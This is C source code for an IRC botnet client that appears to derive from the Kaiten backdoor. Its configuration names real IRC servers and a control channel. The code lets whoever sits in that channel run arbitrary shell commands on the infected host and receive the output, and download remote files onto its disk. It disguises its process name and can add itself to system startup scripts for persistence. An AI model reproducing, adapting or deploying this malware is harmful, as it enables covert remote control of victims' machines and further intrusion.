////////////////////////////////////////////////////////////////////////////////
//                                EDIT THESE                                  //
////////////////////////////////////////////////////////////////////////////////
#undef STARTUP // Start on startup?
#undef IDENT // Only enable this if you absolutely have to
#define FAKENAME "-	test" // What you want this to hide as
#define CHAN "#cx500"         // Channel to join
#define TEMPDIR "/var/tmp"          // Where to save generated ips text file
#define KEY ""   // The key of the channel
#define VERSION "0.1"          // dfnctsc-kaiten release version
#define PORT 8001       // Port of server(s)
int numservers = 1; // Must change this to equal number of servers down there
char *servers[] = {// List the servers in that format, always end in (void*)0
    "chat.freenode.net",
    "wolfe.freenode.net",
    (void*) 0
};
////////////////////////////////////////////////////////////////////////////////
//                               STOP HERE!                                   //
////////////////////////////////////////////////////////////////////////////////
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <ctype.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/file.h>

int sock, changeservers = 0;
char *server, *chan, *key, *nick, *ident, *user, execfile[256], dispass[256];
unsigned int *pids;
unsigned long spoofs = 0, spoofsm = 0, numpids = 0, running = 0;

int strwildmatch(const char* pattern, const char* string) {
    switch (*pattern) {
        case '\0': return *string;
        case '*': return !(!strwildmatch(pattern + 1, string) || (*string && !strwildmatch(pattern, string + 1)));
        case '?': return !(*string && !strwildmatch(pattern + 1, string + 1));
        default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern + 1, string + 1));
    }
}

int send_msg(int sock, char *words, ...) {
    static char textBuffer[1024];
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    return write(sock, textBuffer, strlen(textBuffer));
}

int mfork(char *sender) {
    unsigned int parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (unsigned int*) malloc((numpids + 1) * sizeof (unsigned int));
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

void filter(char *a) {
    while (a[strlen(a) - 1] == '\r' || a[strlen(a) - 1] == '\n') a[strlen(a) - 1] = 0;
}

char *makestring() {
    char *tmp;
    int len = 9, i;
    tmp = (char*) malloc(len + 1);
    memset(tmp, 0, len + 1);
    for (i = 0; i < len; i++) tmp[i] = (rand() % (91 - 65)) + 65;
    return tmp;
}

u_short in_cksum(u_short *addr, int len) {
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void get(int sock, char *sender, int argc, char **argv) {
    int sock2, i, d;
    struct sockaddr_in server;
    unsigned long ipaddr;
    char buf[1024];
    FILE *file;
    unsigned char bufm[4096];
    if (mfork(sender) != 0) return;
    if (argc < 2) {
        send_msg(sock, "PRIVMSG %s :GET <host> <save as>\n", sender);
        exit(0);
    }
    if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        send_msg(sock, "PRIVMSG %s :Unable to create socket.\n", sender);
        exit(0);
    }
    if (!strncmp(argv[1], "http://", 7)) strcpy(buf, argv[1] + 7);
    else strcpy(buf, argv[1]);
    for (i = 0; i < strlen(buf) && buf[i] != '/'; i++);
    buf[i] = 0;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    if ((ipaddr = inet_addr(buf)) == -1) {
        struct hostent *hostm;
        if ((hostm = gethostbyname(buf)) == NULL) {
            send_msg(sock, "PRIVMSG %s :Unable to resolve address.\n", sender);
            exit(0);
        }
        memcpy((char*) &server.sin_addr, hostm->h_addr, hostm->h_length);
    } else server.sin_addr.s_addr = ipaddr;
    memset(&(server.sin_zero), 0, 8);
    if (connect(sock2, (struct sockaddr *) &server, sizeof (server)) != 0) {
        send_msg(sock, "PRIVMSG %s :Unable to connect to http: %d\n", sender, errno);
        exit(0);
    }

    send_msg(sock2, "GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n", buf + i + 1, buf);
    send_msg(sock, "PRIVMSG %s :Receiving file.\n", chan);
    file = fopen(argv[2], "wb");
    while (1) {
        int i;
        if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i] = 0;
        for (d = 0; d < i; d++) if (!strncmp(bufm + d, "\r\n\r\n", 4)) {
                for (d += 4; d < i; d++) fputc(bufm[d], file);
                goto done;
            }
    }
done:
    send_msg(sock, "PRIVMSG %s :Saved as %s\n", chan, argv[2]);
    while (1) {
        int i, d;
        if ((i = recv(sock2, bufm, 4096, 0)) <= 0) break;
        if (i < 4096) bufm[i] = 0;
        for (d = 0; d < i; d++) fputc(bufm[d], file);
    }
    fclose(file);
    close(sock2);
    exit(0);
}

void nickc(int sock, char *sender, int argc, char **argv) {
    if (argc != 1) {
        send_msg(sock, "PRIVMSG %s :NICK <nick>\n", sender);
        return;
    }
    if (strlen(argv[1]) >= 10) {
        send_msg(sock, "PRIVMSG %s :Nick cannot be larger than 9 characters.\n", sender);
        return;
    }
    send_msg(sock, "NICK %s\n", argv[1]);
}

struct iphdr {
    unsigned int ihl : 4, version : 4;
    unsigned char tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short check;
    unsigned long saddr;
    unsigned long daddr;
};

struct udphdr {
    unsigned short source;
    unsigned short dest;
    unsigned short len;
    unsigned short check;
};

struct tcphdr {
    unsigned short source;
    unsigned short dest;
    unsigned long seq;
    unsigned long ack_seq;
    unsigned short res1 : 4, doff : 4;
    unsigned char fin : 1, syn : 1, rst : 1, psh : 1, ack : 1, urg : 1, ece : 1, cwr : 1;
    unsigned short window;
    unsigned short check;
    unsigned short urg_ptr;
};

struct send_tcp {
    struct iphdr ip;
    struct tcphdr tcp;
    char buf[20];
};

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
    char buf[20];
};

unsigned int host2ip(char *sender, char *hostname) {
    static struct in_addr i;
    struct hostent *h;
    if ((i.s_addr = inet_addr(hostname)) == -1) {
        if ((h = gethostbyname(hostname)) == NULL) {
            send_msg(sock, "PRIVMSG %s :Unable to resolve %s\n", sender, hostname);
            exit(0);
        }
        bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
    }
    return i.s_addr;
}

void move(int sock, char *sender, int argc, char **argv) {
    if (argc < 1) {
        send_msg(sock, "PRIVMSG %s :MOVE <server>\n", sender);
        exit(1);
    }
    server = strdup(argv[1]);
    changeservers = 1;
    close(sock);
}

void killd(int sock, char *sender, int argc, char **argv) {
    kill(0, 9);
}

void help(int sock, char *sender, int argc, char **argv) {
    if (mfork(sender) != 0) return;
    send_msg(sock, "NOTICE %s :NICK <nick>                                      = Changes the nick of the client\n", sender);
    send_msg(sock, "NOTICE %s :SERVER <server>                                  = Changes servers\n", sender);
    send_msg(sock, "NOTICE %s :KILL                                             = Kills the client\n", sender);
    send_msg(sock, "NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\n", sender);
    send_msg(sock, "NOTICE %s :HELP                                             = Displays this\n", sender);
    send_msg(sock, "NOTICE %s :IRC <command>                                    = send_msgs this command to the server\n", sender);
    send_msg(sock, "NOTICE %s :SH <command>                                     = Executes a command\n", sender);
    exit(0);
}

struct FMessages {
    char *cmd;
    void (* func)(int, char *, int, char **);
} flooders[] = {

    { "NICK", nickc},
    { "SERVER", move},
    { "GET", get},
    { "KILL", killd},
    { "HELP", help},

    { (char *) 0, (void (*)(int, char *, int, char **))0}
};

void _PRIVMSG(int sock, char *sender, char *str) {
    int i;
    char *to, *message;
    for (i = 0; i < strlen(str) && str[i] != ' '; i++);
    str[i] = 0;
    to = str;
    message = str + i + 2;
    for (i = 0; i < strlen(sender) && sender[i] != '!'; i++);
    sender[i] = 0;
    if (*message == '!' && !strcasecmp(to, chan)) {
        char *params[12], name[1024] = {0};
        int num_params = 0, m;
        message++;
        for (i = 0; i < strlen(message) && message[i] != ' '; i++);
        message[i] = 0;
        if (strwildmatch(message, nick)) return;
        message += i + 1;
        if (!strncmp(message, "IRC ", 4)) send_msg(sock, "%s\n", message + 4);
        if (!strncmp(message, "SH ", 3)) {
            char buf[1024];
            FILE *command;
            if (mfork(sender) != 0) return;
            memset(buf, 0, 1024);
            sprintf(buf, "export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s", message + 3);
            command = popen(buf, "r");
            while (!feof(command)) {
                memset(buf, 0, 1024);
                fgets(buf, 1024, command);
                send_msg(sock, "PRIVMSG %s :%s\n", chan, buf);
                sleep(1);
            }
            pclose(command);
            exit(0);
        }
        m = strlen(message);
        for (i = 0; i < m; i++) {
            if (*message == ' ' || *message == 0) break;
            name[i] = *message;
            message++;
        }
        for (i = 0; i < strlen(message); i++) if (message[i] == ' ') num_params++;
        num_params++;
        if (num_params > 10) num_params = 10;
        params[0] = name;
        params[num_params + 1] = "\0";
        m = 1;
        while (*message != 0) {
            message++;
            if (m >= num_params) break;
            for (i = 0; i < strlen(message) && message[i] != ' '; i++);
            params[m] = (char*) malloc(i + 1);
            strncpy(params[m], message, i);
            params[m][i] = 0;
            m++;
            message += i;
        }
        for (m = 0; flooders[m].cmd != (char *) 0; m++) {
            if (!strcasecmp(flooders[m].cmd, name)) {
                flooders[m].func(sock, sender, num_params - 1, params);
                for (i = 1; i < num_params; i++) free(params[i]);
                return;
            }
        }
    }
}

void _376(int sock, char *sender, char *str) {
    send_msg(sock, "MODE %s -ix\n", nick);
    send_msg(sock, "JOIN %s :%s\n", chan, key);
    send_msg(sock, "WHO %s\n", nick);
}

void _PING(int sock, char *sender, char *str) {
    send_msg(sock, "PONG %s\n", str);
}

void _352(int sock, char *sender, char *str) {
    int i, d;
    char *msg = str;
    struct hostent *hostm;
    unsigned long m;
    for (i = 0, d = 0; d < 5; d++) {
        for (; i < strlen(str) && *msg != ' '; msg++, i++);
        msg++;
        if (i == strlen(str)) return;
    }
    for (i = 0; i < strlen(msg) && msg[i] != ' '; i++);
    msg[i] = 0;
    if (!strcasecmp(msg, nick) && !spoofsm) {
        msg = str;
        for (i = 0, d = 0; d < 3; d++) {
            for (; i < strlen(str) && *msg != ' '; msg++, i++);
            msg++;
            if (i == strlen(str)) return;
        }
        for (i = 0; i < strlen(msg) && msg[i] != ' '; i++);
        msg[i] = 0;
        if ((m = inet_addr(msg)) == -1) {
            if ((hostm = gethostbyname(msg)) == NULL) {
                send_msg(sock, "PRIVMSG %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n", sender);
                return;
            }
            memcpy((char*) &m, hostm->h_addr, hostm->h_length);
        }
        ((char*) &spoofs)[3] = ((char*) &m)[0];
        ((char*) &spoofs)[2] = ((char*) &m)[1];
        ((char*) &spoofs)[1] = ((char*) &m)[2];
        ((char*) &spoofs)[0] = 0;
        spoofsm = 256;
    }
}

void _433(int sock, char *sender, char *str) {
    free(nick);
    nick = makestring();
}

void _NICK(int sock, char *sender, char *str) {
    int i;
    for (i = 0; i < strlen(sender) && sender[i] != '!'; i++);
    sender[i] = 0;
    if (!strcasecmp(sender, nick)) {
        if (*str == ':') str++;
        if (nick) free(nick);
        nick = strdup(str);
    }
}

struct Messages {
    char *cmd;
    void (* func)(int, char *, char *);
} msgs[] = {
    { "352", _352},
    { "376", _376},
    { "433", _433},
    { "422", _376},
    { "PRIVMSG", _PRIVMSG},
    { "PING", _PING},
    { "NICK", _NICK},
    { (char *) 0, (void (*)(int, char *, char *))0}
};

void con() {
    struct sockaddr_in srv;
    unsigned long ipaddr, start;
    int flag;
    struct hostent *hp;
start:
    sock = -1;
    flag = 1;
    if (changeservers == 0) server = servers[rand() % numservers];
    changeservers = 0;
    while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
    if (inet_addr(server) == 0 || inet_addr(server) == -1) {
        if ((hp = gethostbyname(server)) == NULL) {
            server = NULL;
            close(sock);
            goto start;
        }
        bcopy((char*) hp->h_addr, (char*) &srv.sin_addr, hp->h_length);
    } else srv.sin_addr.s_addr = inet_addr(server);
    srv.sin_family = AF_INET;
    srv.sin_port = htons(PORT);
    ioctl(sock, FIONBIO, &flag);
    start = time(NULL);
    while (time(NULL) - start < 10) {
        errno = 0;
        if (connect(sock, (struct sockaddr *) &srv, sizeof (srv)) == 0 || errno == EISCONN) {
            setsockopt(sock, SOL_SOCKET, SO_LINGER, 0, 0);
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, 0, 0);
            setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, 0, 0);
            return;
        }
        if (!(errno == EINPROGRESS || errno == EALREADY)) break;
        sleep(1);
    }
    server = NULL;
    close(sock);
    goto start;
}

int lockfile() {
    int pid_file = open("/tmp/tan.pid", O_CREAT | O_RDWR, 0666);
    int rc = flock(pid_file, LOCK_EX | LOCK_NB);
    if (rc && EWOULDBLOCK == errno) {
        printf("Lockfile found. Exiting.");
        exit(0);
    }
}

int main(int argc, char **argv) {
    lockfile();
    int on, i;
    char cwd[256], *str;
    FILE *file;
#ifdef STARTUP
    str = "/etc/rc.d/rc.local";
    file = fopen(str, "r");
    if (file == NULL) {
        str = "/etc/rc.conf";
        file = fopen(str, "r");
    }
    if (file != NULL) {
        char outfile[256], buf[1024];
        int i = strlen(argv[0]), d = 0;
        getcwd(cwd, 256);
        if (strcmp(cwd, "/")) {
            while (argv[0][i] != '/') i--;
            sprintf(outfile, "\"%s%s\"\n", cwd, argv[0] + i);
            while (!feof(file)) {
                fgets(buf, 1024, file);
                if (!strcasecmp(buf, outfile)) d++;
            }
            if (d == 0) {
                FILE *out;
                fclose(file);
                out = fopen(str, "a");
                if (out != NULL) {
                    fputs(outfile, out);
                    fclose(out);
                }
            } else fclose(file);
        } else fclose(file);
    }
#endif
//    if (fork()) exit(0);
#ifdef FAKENAME
    strncpy(argv[0], FAKENAME, strlen(argv[0]));
    for (on = 1; on < argc; on++) memset(argv[on], 0, strlen(argv[on]));
#endif
    srand((time(NULL) ^ getpid()) + getppid());
    nick = makestring();
    ident = makestring();
    user = "raft";
    chan = CHAN;
    key = KEY;
    server = NULL;
sa:
#ifdef IDENT
    for (i = 0; i < numpids; i++) {
        if (pids[i] != 0 && pids[i] != getpid()) {
            kill(pids[i], 9);
            waitpid(pids[i], NULL, WNOHANG);
        }
    }
    pids = NULL;
    numpids = 0;
    identd();
#endif
    con();
    send_msg(sock, "NICK %s\nUSER %s localhost localhost :%s\n", nick, ident, user);
    while (1) {
        unsigned long i;
        fd_set n;
        struct timeval tv;
        FD_ZERO(&n);
        FD_SET(sock, &n);
        tv.tv_sec = 60 * 20;
        tv.tv_usec = 0;
        if (select(sock + 1, &n, (fd_set*) 0, (fd_set*) 0, &tv) <= 0) goto sa;
        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                unsigned int *newpids, on;
                for (on = i + 1; on < numpids; on++) pids[on - 1] = pids[on];
                pids[on - 1] = 0;
                numpids--;
                newpids = (unsigned int*) malloc((numpids + 1) * sizeof (unsigned int));
                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                free(pids);
                pids = newpids;
            }
        if (FD_ISSET(sock, &n)) {
            char buf[4096], *str;
            int i;
            if ((i = recv(sock, buf, 4096, 0)) <= 0) goto sa;
            buf[i] = 0;
            str = strtok(buf, "\n");
            printf("%s\n", str);
            while (str && *str) {
                char name[1024], sender[1024];
                filter(str);
                if (*str == ':') {
                    for (i = 0; i < strlen(str) && str[i] != ' '; i++);
                    str[i] = 0;
                    strcpy(sender, str + 1);
                    strcpy(str, str + i + 1);
                } else strcpy(sender, "*");
                for (i = 0; i < strlen(str) && str[i] != ' '; i++);
                str[i] = 0;
                strcpy(name, str);
                strcpy(str, str + i + 1);
                for (i = 0; msgs[i].cmd != (char *) 0; i++) if (!strcasecmp(msgs[i].cmd, name)) msgs[i].func(sock, sender, str);
                if (!strcasecmp(name, "ERROR")) goto sa;
                str = strtok((char*) NULL, "\n");
            }
        }
    }
    return 0;
}
